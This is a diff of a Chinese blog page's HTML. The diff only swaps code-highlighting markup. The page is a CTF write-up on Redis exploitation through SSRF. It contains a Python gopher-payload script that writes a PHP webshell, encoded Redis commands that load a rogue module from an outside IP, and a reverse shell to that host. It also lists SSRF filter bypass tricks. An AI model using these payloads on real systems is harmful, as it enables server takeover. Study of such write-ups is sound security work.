@@ -38,13 +38,12 @@
 <span id="more"></span>
 
 <h1 id="redis-getshell-ezweb"><a href="#redis-getshell-ezweb" class="headerlink" title="redis_getshell_ezweb"></a>redis_getshell_ezweb</h1><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>ubuntu 16.04 + docker</p>
-<pre class="language-none"><code class="language-none">cd docker
-docker-compose up -d</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd docker</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>右键源码发现如下备注信息</p>
-<pre class="language-none"><code class="language-none">&lt;!--?secret--&gt;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br></pre></td></tr></table></figure>
 
 <p>直接请求，获取当前靶机环境的ip地址</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121183432.png"></p>
@@ -54,46 +53,7 @@ docker-compose up -d</code></pre>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121183743.png"></p>
 <p>并且进过后续测试发现目标环境是存在过滤的，过滤了<code>file://,dict://</code></p>
 <p>这里直接使用gopher协议直接用脚本尝试写入webshell</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment"># -*- coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> urllib
-<span class="token keyword">import</span> requests
-
-<span class="token comment">#脚本参数修改处</span>
-PATH <span class="token operator">=</span> <span class="token string">'/var/www/html'</span>	
-FILENAME <span class="token operator">=</span> <span class="token string">'shell.php'</span>	
-DEST_REDIS_IP <span class="token operator">=</span> <span class="token string">'192.168.144.2'</span>	<span class="token comment">#存在redis的目标主机IP</span>
-SSRF_VUL_IP <span class="token operator">=</span> <span class="token string">'http://192.168.1.191:5000/index.php?url=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4'</span>
-
-<span class="token comment"># 生成payload</span>
-<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	gopher <span class="token operator">=</span> <span class="token string">"gopher://&#123;&#125;:6379/_"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>DEST_REDIS_IP<span class="token punctuation">)</span>
-	redis_command <span class="token operator">=</span> <span class="token triple-quoted-string string">"""flushall
-set 1 "&lt;?php system('cat /flag');?>"
-config set dir &#123;&#125;
-config set dbfilename &#123;&#125;
-save
-quit
-
-	"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>PATH<span class="token punctuation">,</span> FILENAME<span class="token punctuation">)</span>
-	urlencode_one <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_command<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-	replace_str <span class="token operator">=</span> urlencode_one<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
-	urlencode_two <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>replace_str<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-	payload <span class="token operator">=</span> gopher <span class="token operator">+</span> urlencode_two
-	<span class="token keyword">return</span> payload
-
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	url <span class="token operator">=</span> SSRF_VUL_IP<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-	res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-	main<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本参数修改处</span></span><br><span class="line">PATH = <span class="string">&#x27;/var/www/html&#x27;</span>	</span><br><span class="line">FILENAME = <span class="string">&#x27;shell.php&#x27;</span>	</span><br><span class="line">DEST_REDIS_IP = <span class="string">&#x27;192.168.144.2&#x27;</span>	<span class="comment">#存在redis的目标主机IP</span></span><br><span class="line">SSRF_VUL_IP = <span class="string">&#x27;http://192.168.1.191:5000/index.php?url=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>():</span></span><br><span class="line">	gopher = <span class="string">&quot;gopher://&#123;&#125;:6379/_&quot;</span>.<span class="built_in">format</span>(DEST_REDIS_IP)</span><br><span class="line">	redis_command = <span class="string">&quot;&quot;&quot;flushall</span></span><br><span class="line"><span class="string">set 1 &quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span></span><br><span class="line"><span class="string">config set dir &#123;&#125;</span></span><br><span class="line"><span class="string">config set dbfilename &#123;&#125;</span></span><br><span class="line"><span class="string">save</span></span><br><span class="line"><span class="string">quit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>.<span class="built_in">format</span>(PATH, FILENAME)</span><br><span class="line">	urlencode_one = urllib.parse.quote(redis_command, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	replace_str = urlencode_one.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">	urlencode_two = urllib.parse.quote(replace_str, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	payload = gopher + urlencode_two</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	payload = generate_payload()</span><br><span class="line">	url = SSRF_VUL_IP.<span class="built_in">format</span>(payload)</span><br><span class="line">	<span class="built_in">print</span>(url)</span><br><span class="line">	res = requests.get(url = url, timeout = <span class="number">1</span>)</span><br><span class="line">	<span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210121191915.png"></p>
 <p>根据返回信息发现，判断应该写入成功</p>
@@ -117,115 +77,53 @@ quit
 <li>设置目录</li>
 </ul>
 <p><code>http://e3c2954c-bbf9-47dd-a41a-b7883db9a90c.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_</code></p>
-<pre class="language-none"><code class="language-none">auth root
-config set dir &#x2F;tmp&#x2F;
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%34%25%36%64%25%37%30%25%32%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34
-
-auth root
-config set dbfilename exp.so
-slaveof 149.129.47.247 21000
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%32%25%33%31%25%33%30%25%33%30%25%33%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auth root</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%34%25%36%64%25%37%30%25%32%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br><span class="line"></span><br><span class="line">auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 149.129.47.247 21000</span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%32%25%33%31%25%33%30%25%33%30%25%33%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>导入模块</li>
 </ul>
-<pre class="language-none"><code class="language-none">auth root
-module load .&#x2F;exp.so
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%64%25%36%66%25%36%34%25%37%35%25%36%63%25%36%35%25%32%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%30%25%32%65%25%32%66%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth root</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%64%25%36%66%25%36%34%25%37%35%25%36%63%25%36%35%25%32%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%30%25%32%65%25%32%66%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>关闭主从</li>
 </ul>
-<pre class="language-none"><code class="language-none">auth root
-slaveof no one
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%36%65%25%36%66%25%32%30%25%36%66%25%36%65%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth root</span><br><span class="line">slaveof no one</span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%36%65%25%36%66%25%32%30%25%36%66%25%36%65%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>设置数据库</li>
 </ul>
-<pre class="language-none"><code class="language-none">auth root
-config set dbfilename dump.rdb 
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%34%25%37%35%25%36%64%25%37%30%25%32%65%25%37%32%25%36%34%25%36%32%25%32%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth root</span><br><span class="line">config set dbfilename dump.rdb </span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%34%25%37%35%25%36%64%25%37%30%25%32%65%25%37%32%25%36%34%25%36%32%25%32%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>反弹shell</li>
 </ul>
-<pre class="language-none"><code class="language-none">auth root
-system.rev 149.129.47.247 9999
-quit
-%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%65%25%37%32%25%36%35%25%37%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%39%25%33%39%25%33%39%25%33%39%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth root</span><br><span class="line">system.rev 149.129.47.247 9999</span><br><span class="line">quit</span><br><span class="line">%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%65%25%37%32%25%36%35%25%37%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%39%25%33%39%25%33%39%25%33%39%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122104912.png"></p>
 <h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这边是因为权限没有控制到位的原因，导致可以直接向目标服务器web目录写shell，这里就直接上脚本</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
-<span class="token comment"># -*- coding:utf-8 -*-</span>
-
-<span class="token keyword">import</span> urllib
-<span class="token keyword">import</span> requests
-
-<span class="token comment">#脚本参数修改处</span>
-PATH <span class="token operator">=</span> <span class="token string">'/var/www/html'</span>	
-FILENAME <span class="token operator">=</span> <span class="token string">'shell.php'</span>	
-DEST_REDIS_IP <span class="token operator">=</span> <span class="token string">'192.168.144.2'</span>	<span class="token comment">#存在redis的目标主机IP</span>
-SSRF_VUL_IP <span class="token operator">=</span> <span class="token string">'http://192.168.1.191:5000/index.php?url=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4'</span>
-
-<span class="token comment"># 生成payload</span>
-<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	gopher <span class="token operator">=</span> <span class="token string">"gopher://&#123;&#125;:6379/_"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>DEST_REDIS_IP<span class="token punctuation">)</span>
-	redis_command <span class="token operator">=</span> <span class="token triple-quoted-string string">"""AUTH root
-flushall
-set 1 "&lt;?php system('cat /flag');?>"
-config set dir &#123;&#125;
-config set dbfilename &#123;&#125;
-save
-quit
-
-	"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>PATH<span class="token punctuation">,</span> FILENAME<span class="token punctuation">)</span>
-	urlencode_one <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_command<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-	replace_str <span class="token operator">=</span> urlencode_one<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
-	urlencode_two <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>replace_str<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-	payload <span class="token operator">=</span> gopher <span class="token operator">+</span> urlencode_two
-	<span class="token keyword">return</span> payload
-
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	url <span class="token operator">=</span> SSRF_VUL_IP<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-	<span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-	<span class="token comment">#res = requests.get(url = url, timeout = 1)</span>
-	<span class="token comment">#print(res.text)</span>
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-	main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本参数修改处</span></span><br><span class="line">PATH = <span class="string">&#x27;/var/www/html&#x27;</span>	</span><br><span class="line">FILENAME = <span class="string">&#x27;shell.php&#x27;</span>	</span><br><span class="line">DEST_REDIS_IP = <span class="string">&#x27;192.168.144.2&#x27;</span>	<span class="comment">#存在redis的目标主机IP</span></span><br><span class="line">SSRF_VUL_IP = <span class="string">&#x27;http://192.168.1.191:5000/index.php?url=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>():</span></span><br><span class="line">	gopher = <span class="string">&quot;gopher://&#123;&#125;:6379/_&quot;</span>.<span class="built_in">format</span>(DEST_REDIS_IP)</span><br><span class="line">	redis_command = <span class="string">&quot;&quot;&quot;AUTH root</span></span><br><span class="line"><span class="string">flushall</span></span><br><span class="line"><span class="string">set 1 &quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span></span><br><span class="line"><span class="string">config set dir &#123;&#125;</span></span><br><span class="line"><span class="string">config set dbfilename &#123;&#125;</span></span><br><span class="line"><span class="string">save</span></span><br><span class="line"><span class="string">quit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>.<span class="built_in">format</span>(PATH, FILENAME)</span><br><span class="line">	urlencode_one = urllib.parse.quote(redis_command, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	replace_str = urlencode_one.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">	urlencode_two = urllib.parse.quote(replace_str, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	payload = gopher + urlencode_two</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	payload = generate_payload()</span><br><span class="line">	url = SSRF_VUL_IP.<span class="built_in">format</span>(payload)</span><br><span class="line">	<span class="built_in">print</span>(url)</span><br><span class="line">	<span class="comment">#res = requests.get(url = url, timeout = 1)</span></span><br><span class="line">	<span class="comment">#print(res.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
 
 
 
 <h1 id="ssrf绕过与防御"><a href="#ssrf绕过与防御" class="headerlink" title="ssrf绕过与防御"></a>ssrf绕过与防御</h1><h2 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h2><p>1.@</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;abc@127.0.0.1
-实际上是以用户名abc连接到站点127.0.0.1，同理
-http:&#x2F;&#x2F;8.8.8.8@127.0.0.1:8080、http:&#x2F;&#x2F;127.0.0.1#8.8.8.8</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</span><br></pre></td></tr></table></figure>
 
 <p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而`libcur`l则识别为www.bbb.com/">www.ccc.com，而`libcur`l则识别为www.bbb.com</a></p>
 <p>2.利用[::]<br>可以利用<code>[::]</code>来绕过localhost</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>3.添加端口号</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8080</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
 
 <p>4.利用短网址<br><a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/dwz.aspx">站长工具短网址</a><br><a target="_blank" rel="noopener" href="http://dwz.cn/">百度短网址</a><br>5.利用特殊域名<br>原理是DNS解析。xip.io可以指向任意域名，即</p>
-<pre class="language-none"><code class="language-none">127.0.0.1.xip.io，可解析为127.0.0.1</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>6.利用DNS解析<br>在域名上设置A记录，指向127.0.1<br>7.利用进制转换</p>
 <blockquote>
 <p>127.0.0.1<br>八进制：0177.0.0.1<br>十六进制：0x7f.0.0.1<br>十进制：2130706433</p>
 </blockquote>
 <p>8.句号</p>
-<pre class="language-none"><code class="language-none">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>9.302跳转<br>使用<a target="_blank" rel="noopener" href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p>
 <h2 id="常见限制手段"><a href="#常见限制手段" class="headerlink" title="常见限制手段"></a>常见限制手段</h2><p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名<br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br>2.限制请求IP不为内网地址<br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br>3.限制请求只为http协议<br>（1）采取302跳转<br>（2）采取短地址</p>
